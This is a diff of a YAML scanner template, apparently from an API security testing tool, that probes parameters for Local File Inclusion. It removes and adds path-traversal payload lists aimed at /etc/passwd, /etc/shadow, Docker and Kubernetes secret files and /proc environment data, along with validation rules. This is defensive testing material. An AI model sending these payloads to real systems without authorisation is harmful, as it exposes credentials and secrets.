@@ -1,9 +1,9 @@
 id: SMART_LFI_IN_PARAMETER
 info:
-  name: LFI in Parameter - Smart Testing
-  description: Smart testing for Local File Inclusion vulnerabilities. Detects when applications fail to properly validate file path inputs in parameters, headers, and URL paths, allowing unauthorized file access.
-  details: Tests for Local File Inclusion by intelligently fuzzing file path parameters with various traversal techniques, encoding methods, and null byte injections. The system detects vulnerabilities across different parameter locations (query, body, headers, path) and encoding variations.
-  impact: Unauthorized file access, sensitive data disclosure, server configuration exposure, credential theft, code execution, and complete system compromise.
+  name: "LFI in Parameter - Smart Testing"
+  description: "Test Local File Inclusion by replacing path-like body or query parameters with path-traversal and sensitive-file payloads. Keep baseline method, URL, and auth headers intact; mutate only in-scope parameter values."
+  details: "Clone the baseline. Across 4-5+ probes escalate path traversal into string parameters that look path-related or accept file names: basic ../ sequences toward /etc/passwd, URL-encoded and double-encoded variants, null-byte suffixes, and alternate OS path styles when useful. Vary target fields. Proof vs baseline: THIS response contains file contents absent from baseline (e.g. root:x:0:0:, passwd/shadow markers, config snippets, docker/k8s paths). Generic 200 with unchanged business body, or merely echoing the traversal string, is NOT vulnerable. Prefer deeper traversal / encoding after a miss."
+  impact: "Unauthorized file access, sensitive data disclosure, credential theft, and potential system compromise."
   category:
     name: LFI
     shortName: Local File Inclusion
@@ -38,36 +38,6 @@ api_selection_filters:
     lt: 300
   method:
     neq: "OPTIONS"
-  response_payload:
-    length:
-      gt: 0
-    not_contains_either:
-      - Error
-      - Internal Server
-      - Failed
-      - Unauthorized
-      - access denied
-      - Forbidden
-      - Method Not allowed
-      - Gateway timeout
-      - request timeout
-      - server error
-      - server busy
-      - authentication error
-      - authorization error
-      - validation error
-      - Permission Denied
-      - invalid token
-      - token expired
-      - session expired
-      - session timeout
-      - unexpected error
-      - unable to process request
-      - bad request
-      - service unavailable
-      - account is locked
-      - account is blocked
-      - multiple failed attempts
   or:
     - request_payload:
         for_one:
@@ -85,163 +55,17 @@ api_selection_filters:
             extract: file_value
 
 wordLists:
-  basicTraversal:
-    - "/etc/passwd"
-    - "/etc/npasswd"
-    - "../etc/passwd"
-    - "../../etc/passwd"
-    - "../../../etc/passwd"
-    - "../../../../etc/passwd"
-    - "../../../../../etc/passwd"
+  lfiPayloads:
     - "../../../../../../etc/passwd"
-  doubleSlashTraversal:
-    - "..//etc/passwd"
-    - "../..///etc/passwd"
-    - "../../..///etc/passwd"
-    - "../../../..///etc/passwd"
-    - "../../../../..///etc/passwd"
-    - "../../../../../..///etc/passwd"
-  urlEncodedTraversal:
-    - "..%2f/etc/passwd"
-    - "..%2f..%2f/etc/passwd"
-    - "..%2f..%2f..%2f/etc/passwd"
-    - "..%2f..%2f..%2f..%2f/etc/passwd"
-    - "..%2f..%2f..%2f..%2f..%2f/etc/passwd"
-    - "..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd"
-  backslashTraversal:
-    - "..\\etc/passwd"
-    - "..\\..\\etc/passwd"
-    - "..\\..\\..\\etc/passwd"
-    - "..\\..\\..\\..\\etc/passwd"
-  doubleUrlEncodedTraversal:
-    - "..%252f..%252f..%252fvar%252flib%252fdocker%252fcontainers"
-    - "..%5c..%5c..%5cC:%5cWindows%5cMicrosoft.NET%5cFramework%5cv4.0.30319%5cConfig%5cmachine.config"
-  hexEncodedTraversal:
-    - "0x2e0x2e//etc/passwd"
-    - "0x2e0x2e/0x2e0x2e//etc/passwd"
-    - "..0x2f/etc/passwd"
-    - "..0x2f..0x2f/etc/passwd"
-    - "..0x2f..0x2f..0x2f/etc/passwd"
-  unicodeTraversal:
-    - "..%c0%afdocker.sock"
-  nullByteTraversal:
-    - "../../../../../../../../../../../../etc/passwd%00"
-    - "../../../../../../../../../../../../etc/shadow%00"
-    - "../../../../../../../../../../../../root/.bash_history%00"
-  dockerFiles:
-    - "/var/lib/docker/containers"
-    - "/var/lib/docker/containers/*/config.v2.json"
-    - "/var/lib/docker/containers/*/hostconfig.json"
-    - "/root/.docker/config.json"
-    - "/var/run/docker.sock"
-  kubernetesFiles:
-    - "/var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/*/token"
-    - "/etc/kubernetes/admin.conf"
-    - "/root/.kube/config"
-  systemFiles:
-    - "/proc/self/environ"
-    - "/proc/self/cmdline"
-    - "/sys/class/net/eth0/address"
-    - "/etc/resolv.conf"
-  logFiles:
-    - "/var/log/docker.log"
-    - "/var/log/kube-apiserver.log"
+    - "..%2f..%2f..%2f..%2fetc/passwd"
+    - "../../../../../../etc/passwd%00"
+    - "/etc/passwd"
 
 execute:
-  type: multiple
+  type: single
   requests:
     - req:
-        - modify_query_param:
-            file_path: ${basicTraversal}
         - modify_body_param:
-            file_path: ${basicTraversal}
-        - validate:
-            response_code:
-              gte: 200
-              lt: 300
-            response_payload:
-              length:
-                gt: 0
-              contains_either:
-                - "root:x:0:0:"
-                - "daemon:x:"
-                - "/bin/bash"
-                - "/usr/sbin/nologin"
-        - success: x1
-        - failure: continue
-    - req:
+            file_path: ${lfiPayloads}
         - modify_query_param:
-            file_path: ${doubleSlashTraversal}
-        - modify_body_param:
-            file_path: ${doubleSlashTraversal}
-        - validate:
-            response_code:
-              gte: 200
-              lt: 300
-            response_payload:
-              length:
-                gt: 0
-              contains_either:
-                - "root:x:0:0:"
-                - "daemon:x:"
-        - success: x2
-        - failure: continue
-    - req:
-        - modify_query_param:
-            file_path: ${urlEncodedTraversal}
-        - modify_body_param:
-            file_path: ${urlEncodedTraversal}
-        - validate:
-            response_code:
-              gte: 200
-              lt: 300
-            response_payload:
-              length:
-                gt: 0
-              contains_either:
-                - "root:x:0:0:"
-                - "daemon:x:"
-        - success: x3
-        - failure: continue
-    - req:
-        - modify_query_param:
-            file_path: ${dockerFiles}
-        - modify_body_param:
-            file_path: ${dockerFiles}
-        - validate:
-            response_code:
-              gte: 200
-              lt: 300
-            response_payload:
-              length:
-                gt: 0
-        - success: x4
-        - failure: continue
-    - req:
-        - modify_query_param:
-            file_path: ${kubernetesFiles}
-        - modify_body_param:
-            file_path: ${kubernetesFiles}
-        - validate:
-            response_code:
-              gte: 200
-              lt: 300
-            response_payload:
-              length:
-                gt: 0
-        - success: x5
-        - failure: continue
-    - req:
-        - modify_query_param:
-            file_path: ${nullByteTraversal}
-        - modify_body_param:
-            file_path: ${nullByteTraversal}
-        - validate:
-            response_code:
-              gte: 200
-              lt: 300
-            response_payload:
-              length:
-                gt: 0
-        - success: vulnerable
-
+            file_path: ${lfiPayloads}
